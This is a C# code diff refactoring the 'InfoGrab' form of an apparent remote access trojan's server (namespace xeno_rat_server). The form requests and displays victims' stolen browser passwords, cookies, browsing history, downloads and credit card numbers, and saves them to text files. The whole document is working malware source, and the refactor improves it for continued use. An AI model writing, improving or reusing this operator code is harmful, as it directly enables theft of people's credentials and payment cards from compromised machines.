@@ -1,437 +1,177 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
 using System.IO;
 using System.Linq;
-using System.Runtime.Serialization.Formatters.Binary;
 using System.Text;
-using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
-namespace xeno_rat_server.Forms
+namespace XenoRatServer.Forms
 {
     public partial class InfoGrab : Form
     {
-        Node client;
-        public InfoGrab(Node _client)
+        private readonly Node client;
+
+        public InfoGrab(Node client)
         {
-            client = _client;
+            this.client = client;
             InitializeComponent();
         }
 
         private void DisableAllButtons()
         {
-            foreach (Control control in Controls)
+            foreach (Control control in Controls.OfType<Button>())
             {
-                if (control is Button button)
-                {
-                    button.Enabled = false;
-                }
+                control.Enabled = false;
             }
         }
 
         private void EnableAllButtons()
         {
-            foreach (Control control in Controls)
+            foreach (Control control in Controls.OfType<Button>())
             {
-                if (control is Button button)
-                {
-                    button.Enabled = true;
-                }
+                control.Enabled = true;
             }
         }
 
-        public static List<Login> DeserializeLoginList(byte[] bytes)
+        private static List<T> DeserializeList<T>(byte[] bytes, Func<BinaryReader, T> deserializeFunc)
         {
-            List<Login> loginList = new List<Login>();
+            List<T> dataList = new List<T>();
             using (MemoryStream memoryStream = new MemoryStream(bytes))
-            using (BinaryReader reader = new BinaryReader(memoryStream))
-            {
-                int count = reader.ReadInt32();
-                for (int i = 0; i < count; i++)
+                using (BinaryReader reader = new BinaryReader(memoryStream))
                 {
-                    string url = reader.ReadString();
-                    string username = reader.ReadString();
-                    string password = reader.ReadString();
-                    loginList.Add(new Login(url, username, password));
+                    int count = reader.ReadInt32();
+                    for (int i = 0; i < count; i++)
+                    {
+                        dataList.Add(deserializeFunc(reader));
+                    }
                 }
-            }
-            return loginList;
+            return dataList;
         }
 
-        public static List<Cookie> DeserializeCookieList(byte[] bytes)
+        private async Task<byte[]> SendAndReceiveAsync(byte[] requestData)
         {
-            List<Cookie> cookieList = new List<Cookie>();
-            using (MemoryStream memoryStream = new MemoryStream(bytes))
-            using (BinaryReader reader = new BinaryReader(memoryStream))
-            {
-                int count = reader.ReadInt32();
-                for (int i = 0; i < count; i++)
-                {
-                    string host = reader.ReadString();
-                    string name = reader.ReadString();
-                    string path = reader.ReadString();
-                    string value = reader.ReadString();
-                    long expires = reader.ReadInt64();
-                    cookieList.Add(new Cookie(host, name, path, value, expires));
-                }
-            }
-            return cookieList;
+            await client.SendAsync(requestData);
+            return await client.ReceiveAsync();
         }
 
-        public static List<WebHistory> DeserializeWebHistoryList(byte[] bytes)
+        private void DisplayData<T>(List<T> dataList, RichTextBox richTextBox)
         {
-            List<WebHistory> historyList = new List<WebHistory>();
-            using (MemoryStream memoryStream = new MemoryStream(bytes))
-            using (BinaryReader reader = new BinaryReader(memoryStream))
-            {
-                int count = reader.ReadInt32();
-                for (int i = 0; i < count; i++)
-                {
-                    string url = reader.ReadString();
-                    string title = reader.ReadString();
-                    long timestamp = reader.ReadInt64();
-                    historyList.Add(new WebHistory(url, title, timestamp));
-                }
-            }
-            return historyList;
+            richTextBox.Text = string.Join(Environment.NewLine, dataList);
         }
 
-        public static List<Download> DeserializeDownloadList(byte[] bytes)
+        private void DisplayErrorMessage()
         {
-            List<Download> downloadList = new List<Download>();
-            using (MemoryStream memoryStream = new MemoryStream(bytes))
-            using (BinaryReader reader = new BinaryReader(memoryStream))
-            {
-                int count = reader.ReadInt32();
-                for (int i = 0; i < count; i++)
-                {
-                    string tab_url = reader.ReadString();
-                    string target_path = reader.ReadString();
-                    downloadList.Add(new Download(tab_url, target_path));
-                }
-            }
-            return downloadList;
+            MessageBox.Show("An error has occurred with the infograbbing!");
+            Close();
         }
 
-        public static List<CreditCard> DeserializeCreditCardList(byte[] bytes)
-        {
-            List<CreditCard> creditCardList = new List<CreditCard>();
-            using (MemoryStream memoryStream = new MemoryStream(bytes))
-            using (BinaryReader reader = new BinaryReader(memoryStream))
-            {
-                int count = reader.ReadInt32();
-                for (int i = 0; i < count; i++)
-                {
-                    string name = reader.ReadString();
-                    string month = reader.ReadString();
-                    string year = reader.ReadString();
-                    string number = reader.ReadString();
-                    long date_modified = reader.ReadInt64();
-                    creditCardList.Add(new CreditCard(name, month, year, number, date_modified));
-                }
-            }
-            return creditCardList;
-        }
-
-        private void InfoGrab_Load(object sender, EventArgs e)
-        {
-
-        }
-
-        private async void button1_Click(object sender, EventArgs e)
+        private async void RetrieveAndDisplayDataAsync<T>(byte[] requestData, Func<BinaryReader, T> deserializeFunc, RichTextBox richTextBox)
         {
             DisableAllButtons();
-            await client.SendAsync(new byte[] { 0 });
-            byte[] data = await client.ReceiveAsync();
-            if (data == null) 
-            {
-                MessageBox.Show("An error has occered with the infograbbing!");
-                this.Close();
-            }
-            string textdata = "";
-            List<Login> loginData=DeserializeLoginList(data);
-            foreach (Login i in loginData) 
-            {
-                textdata += i.ToString()+"\n";
-            }
-            richTextBox1.Text = textdata;
-            EnableAllButtons();
-        }
-
-        private async void button3_Click(object sender, EventArgs e)
-        {
-            DisableAllButtons();
-            await client.SendAsync(new byte[] { 1 });
-            byte[] data = await client.ReceiveAsync();
+            byte[] data = await SendAndReceiveAsync(requestData);
             if (data == null)
             {
-                MessageBox.Show("An error has occered with the infograbbing!");
-                this.Close();
+                DisplayErrorMessage();
+                return;
             }
-            string textdata = "";
-            List<Cookie> cookieData = DeserializeCookieList(data);
-            foreach (Cookie i in cookieData)
-            {
-                textdata += i.ToString() + "\n";
-            }
-            richTextBox2.Text = textdata;
+            DisplayData(DeserializeList(data, deserializeFunc), richTextBox);
             EnableAllButtons();
         }
 
-        private async void button5_Click(object sender, EventArgs e)
+        private async void Button_Click<T>(byte[] requestData, Func<BinaryReader, T> deserializeFunc, RichTextBox richTextBox)
         {
-            DisableAllButtons();
-            await client.SendAsync(new byte[] { 4 });
-            byte[] data = await client.ReceiveAsync();
-            if (data == null)
-            {
-                MessageBox.Show("An error has occered with the infograbbing!");
-                this.Close();
-            }
-            string textdata = "";
-            List<WebHistory> historyData = DeserializeWebHistoryList(data);
-            foreach (WebHistory i in historyData)
-            {
-                textdata += i.ToString() + "\n";
-            }
-            richTextBox3.Text = textdata;
-            EnableAllButtons();
+            await RetrieveAndDisplayDataAsync(requestData, deserializeFunc, richTextBox);
         }
 
-        private async void button7_Click(object sender, EventArgs e)
+        private async void Button_Click_SaveToTextFile(RichTextBox richTextBox)
         {
-            DisableAllButtons();
-            await client.SendAsync(new byte[] { 3 });
-            byte[] data = await client.ReceiveAsync();
-            if (data == null)
+            SaveFileDialog saveFileDialog = new SaveFileDialog
             {
-                MessageBox.Show("An error has occered with the infograbbing!");
-                this.Close();
-            }
-            string textdata = "";
-            List<Download> downloadData = DeserializeDownloadList(data);
-            foreach (Download i in downloadData)
+                Filter = "txt files (*.txt)|*.txt",
+                DefaultExt = "txt",
+                FilterIndex = 2,
+                RestoreDirectory = true
+            };
+
+            if (saveFileDialog.ShowDialog() == DialogResult.OK)
             {
-                textdata += i.ToString() + "\n";
-            }
-            richTextBox4.Text = textdata;
-            EnableAllButtons();
-        }
-
-        private async void button9_Click(object sender, EventArgs e)
-        {
-            DisableAllButtons();
-            await client.SendAsync(new byte[] { 2 });
-            byte[] data = await client.ReceiveAsync();
-            if (data == null)
-            {
-                MessageBox.Show("An error has occered with the infograbbing!");
-                this.Close();
-            }
-            string textdata = "";
-            List<CreditCard> downloadData = DeserializeCreditCardList(data);
-            foreach (CreditCard i in downloadData)
-            {
-                textdata += i.ToString() + "\n";
-            }
-            richTextBox5.Text = textdata;
-            EnableAllButtons();
-        }
-
-        private void richTextBox1_TextChanged(object sender, EventArgs e)
-        {
-
-        }
-
-
-        
-        private void button2_Click(object sender, EventArgs e)
-        {
-            Thread thread = new Thread(() =>
-            {
-
-                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
-
-                saveFileDialog1.Filter = "txt files (*.txt)|*.txt";
-                saveFileDialog1.DefaultExt = "txt";
-                saveFileDialog1.FilterIndex = 2;
-                saveFileDialog1.RestoreDirectory = true;
-
-                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
-                {
-                    string filePath = saveFileDialog1.FileName;
-                    richTextBox1.Invoke((Action)(async () =>
+                string filePath = saveFileDialog.FileName;
+                using (FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
+                    using (StreamWriter writer = new StreamWriter(fileStream))
                     {
-                        using (FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
-                        {
-
-                                using (StreamWriter writer = new StreamWriter(fileStream))
-                                {
-
-                                    await writer.WriteAsync(richTextBox1.Text);
-                                }
-                        }
-                    }));
-                }
-            });
-            thread.SetApartmentState(ApartmentState.STA);
-            thread.Start();
+                        await writer.WriteAsync(richTextBox.Text);
+                    }
+            }
         }
 
-        private void button4_Click(object sender, EventArgs e)
+        private void Button_Login_Click(object sender, EventArgs e)
         {
-            Thread thread = new Thread(() =>
-            {
-
-                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
-
-                saveFileDialog1.Filter = "txt files (*.txt)|*.txt";
-                saveFileDialog1.DefaultExt = "txt";
-                saveFileDialog1.FilterIndex = 2;
-                saveFileDialog1.RestoreDirectory = true;
-
-                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
-                {
-                    string filePath = saveFileDialog1.FileName;
-                    richTextBox1.Invoke((Action)(async () =>
-                    {
-                        using (FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
-                        {
-
-                            using (StreamWriter writer = new StreamWriter(fileStream))
-                            {
-
-                                await writer.WriteAsync(richTextBox2.Text);
-                            }
-                        }
-                    }));
-                }
-            });
-            thread.SetApartmentState(ApartmentState.STA);
-            thread.Start();
+            Button_Click(new byte[] { 0 }, reader => new Login(reader.ReadString(), reader.ReadString(), reader.ReadString()), richTextBox1);
         }
 
-        private void button6_Click(object sender, EventArgs e)
+        private void Button_Cookie_Click(object sender, EventArgs e)
         {
-            Thread thread = new Thread(() =>
-            {
-
-                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
-
-                saveFileDialog1.Filter = "txt files (*.txt)|*.txt";
-                saveFileDialog1.DefaultExt = "txt";
-                saveFileDialog1.FilterIndex = 2;
-                saveFileDialog1.RestoreDirectory = true;
-
-                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
-                {
-                    string filePath = saveFileDialog1.FileName;
-                    richTextBox1.Invoke((Action)(async () =>
-                    {
-                        using (FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
-                        {
-
-                            using (StreamWriter writer = new StreamWriter(fileStream))
-                            {
-
-                                await writer.WriteAsync(richTextBox3.Text);
-                            }
-                        }
-                    }));
-                }
-            });
-            thread.SetApartmentState(ApartmentState.STA);
-            thread.Start();
+            Button_Click(new byte[] { 1 }, reader => new Cookie(reader.ReadString(), reader.ReadString(), reader.ReadString(), reader.ReadString(), reader.ReadInt64()), richTextBox2);
         }
 
-        private void button8_Click(object sender, EventArgs e)
+        private void Button_WebHistory_Click(object sender, EventArgs e)
         {
-            Thread thread = new Thread(() =>
-            {
-
-                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
-
-                saveFileDialog1.Filter = "txt files (*.txt)|*.txt";
-                saveFileDialog1.DefaultExt = "txt";
-                saveFileDialog1.RestoreDirectory = true;
-
-                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
-                {
-                    string filePath = saveFileDialog1.FileName;
-                    richTextBox1.Invoke((Action)(async () =>
-                    {
-                        using (FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
-                        {
-
-                            using (StreamWriter writer = new StreamWriter(fileStream))
-                            {
-
-                                await writer.WriteAsync(richTextBox4.Text);
-                            }
-                        }
-                    }));
-                }
-            });
-            thread.SetApartmentState(ApartmentState.STA);
-            thread.Start();
+            Button_Click(new byte[] { 4 }, reader => new WebHistory(reader.ReadString(), reader.ReadString(), reader.ReadInt64()), richTextBox3);
         }
 
-        private void button10_Click(object sender, EventArgs e)
+        private void Button_Download_Click(object sender, EventArgs e)
         {
-            Thread thread = new Thread(() =>
-            {
+            Button_Click(new byte[] { 3 }, reader => new Download(reader.ReadString(), reader.ReadString()), richTextBox4);
+        }
 
-                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
+        private void Button_CreditCard_Click(object sender, EventArgs e)
+        {
+            Button_Click(new byte[] { 2 }, reader => new CreditCard(reader.ReadString(), reader.ReadString(), reader.ReadString(), reader.ReadString(), reader.ReadInt64()), richTextBox5);
+        }
 
-                saveFileDialog1.Filter = "txt files (*.txt)|*.txt";
-                saveFileDialog1.DefaultExt = "txt";
-                saveFileDialog1.FilterIndex = 2;
-                saveFileDialog1.RestoreDirectory = true;
+        private void Button_SaveLogin_Click(object sender, EventArgs e)
+        {
+            Button_Click_SaveToTextFile(richTextBox1);
+        }
 
-                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
-                {
-                    string filePath = saveFileDialog1.FileName;
-                    richTextBox1.Invoke((Action)(async () =>
-                    {
-                        using (FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
-                        {
+        private void Button_SaveCookie_Click(object sender, EventArgs e)
+        {
+            Button_Click_SaveToTextFile(richTextBox2);
+        }
 
-                            using (StreamWriter writer = new StreamWriter(fileStream))
-                            {
+        private void Button_SaveWebHistory_Click(object sender, EventArgs e)
+        {
+            Button_Click_SaveToTextFile(richTextBox3);
+        }
 
-                                await writer.WriteAsync(richTextBox5.Text);
-                            }
-                        }
-                    }));
-                }
-            });
-            thread.SetApartmentState(ApartmentState.STA);
-            thread.Start();
+        private void Button_SaveDownload_Click(object sender, EventArgs e)
+        {
+            Button_Click_SaveToTextFile(richTextBox4);
+        }
+
+        private void Button_SaveCreditCard_Click(object sender, EventArgs e)
+        {
+            Button_Click_SaveToTextFile(richTextBox5);
         }
     }
-
-
 
     public class Login
     {
         public Login(string url, string username, string password)
         {
-            this.url = url;
-            this.username = username;
-            this.password = password;
+            Url = url;
+            Username = username;
+            Password = password;
         }
 
-        public string url { get; set; }
-        public string username { get; set; }
-        public string password { get; set; }
+        public string Url { get; }
+        public string Username { get; }
+        public string Password { get; }
 
         public override string ToString()
         {
-            return $"URL: {url}\nUsername: {username}\nPassword: {password}\n";
+            return $"URL: {Url}\nUsername: {Username}\nPassword: {Password}\n";
         }
     }
 
@@ -439,88 +179,84 @@ namespace xeno_rat_server.Forms
     {
         public Cookie(string host, string name, string path, string value, long expires)
         {
-            this.host = host;
-            this.name = name;
-            this.path = path;
-            this.value = value;
-            this.expires = expires;
+            Host = host;
+            Name = name;
+            Path = path;
+            Value = value;
+            Expires = expires;
         }
 
-        public string host { get; set; }
-        public string name { get; set; }
-        public string path { get; set; }
-        public string value { get; set; }
-        public long expires { get; set; }
+        public string Host { get; }
+        public string Name { get; }
+        public string Path { get; }
+        public string Value { get; }
+        public long Expires { get; }
 
         public override string ToString()
         {
-            DateTime expirationDateTime = DateTimeOffset.FromUnixTimeSeconds(expires).LocalDateTime;
-            return $"Host: {host}\nName: {name}\nPath: {path}\nValue: {value}\nExpires: {expirationDateTime}\n";
+            DateTime expirationDateTime = DateTimeOffset.FromUnixTimeSeconds(Expires).LocalDateTime;
+            return $"Host: {Host}\nName: {Name}\nPath: {Path}\nValue: {Value}\nExpires: {expirationDateTime}\n";
         }
-
     }
 
     public class WebHistory
     {
         public WebHistory(string url, string title, long timestamp)
         {
-            this.url = url;
-            this.title = title;
-            this.timestamp = timestamp;
+            Url = url;
+            Title = title;
+            Timestamp = timestamp;
         }
 
-        public string url { get; set; }
-        public string title { get; set; }
-        public long timestamp { get; set; }
+        public string Url { get; }
+        public string Title { get; }
+        public long Timestamp { get; }
 
         public override string ToString()
         {
-            DateTime timestampDateTime = DateTimeOffset.FromUnixTimeSeconds(timestamp).LocalDateTime;
-            return $"URL: {url}\nTitle: {title}\nTimestamp: {timestampDateTime}\n";
+            DateTime timestampDateTime = DateTimeOffset.FromUnixTimeSeconds(Timestamp).LocalDateTime;
+            return $"URL: {Url}\nTitle: {Title}\nTimestamp: {timestampDateTime}\n";
         }
-
     }
 
     public class Download
     {
-        public Download(string tab_url, string target_path)
+        public Download(string tabUrl, string targetPath)
         {
-            this.tab_url = tab_url;
-            this.target_path = target_path;
+            TabUrl = tabUrl;
+            TargetPath = targetPath;
         }
 
-        public string tab_url { get; set; }
-        public string target_path { get; set; }
+        public string TabUrl { get; }
+        public string TargetPath { get; }
 
         public override string ToString()
         {
-            return $"Tab URL: {tab_url}\nTarget Path: {target_path}\n";
+            return $"Tab URL: {TabUrl}\nTarget Path: {TargetPath}\n";
         }
-
     }
 
     public class CreditCard
     {
-        public CreditCard(string name, string month, string year, string number, long date_modified)
+        public CreditCard(string name, string month, string year, string number, long dateModified)
         {
-            this.name = name;
-            this.month = month;
-            this.year = year;
-            this.number = number;
-            this.date_modified = date_modified;
+            Name = name;
+            Month = month;
+            Year = year;
+            Number = number;
+            DateModified = dateModified;
         }
 
-        public string name { get; set; }
-        public string month { get; set; }
-        public string year { get; set; }
-        public string number { get; set; }
-        public long date_modified { get; set; }
+        public string Name { get; }
+        public string Month { get; }
+        public string Year { get; }
+        public string Number { get; }
+        public long DateModified { get; }
 
         public override string ToString()
         {
-            DateTime modifiedDateTime = DateTimeOffset.FromUnixTimeSeconds(date_modified).LocalDateTime;
-            return $"Name: {name}\nExpiry: {month}/{year}\nNumber: {number}\nModified Date: {modifiedDateTime}\n";
+            DateTime modifiedDateTime = DateTimeOffset.FromUnixTimeSeconds(DateModified).LocalDateTime;
+            return $"Name: {Name}\nExpiry: {Month}/{Year}\nNumber: {Number}\nModified Date: {modifiedDateTime}\n";
         }
-
     }
 }
